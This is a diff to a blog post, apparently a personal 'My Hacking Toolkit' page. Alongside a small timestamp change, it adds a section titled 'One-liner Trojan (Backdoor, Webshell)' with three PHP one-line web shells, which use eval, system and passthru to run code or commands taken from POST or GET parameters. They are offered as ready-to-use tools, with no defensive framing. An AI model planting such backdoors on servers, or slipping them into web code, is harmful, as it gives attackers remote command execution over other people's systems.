@@ -6,7 +6,7 @@ cover: https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/9
 date: '2024-09-03T23:50:41.047232+08:00'
 tags: []
 title: My Hacking Toolkit
-updated: '2024-09-04T00:40:17.215+08:00'
+updated: '2024-09-04T03:08:18.980+08:00'
 ---
 # Temp Server (Python)
 
@@ -45,3 +45,15 @@ if __name__ == '__main__':
     print('Server running on http://localhost:8080/')
     httpd.serve_forever()
 ```
+
+# One-liner Trojan (Backdoor, Webshell)
+
+```php
+<?php @eval($_POST['shell']);?>
+<?php @system($_POST["cmd"])?>
+<?php passthru($_GET['cmd']); ?>
+```
+
+
+
+
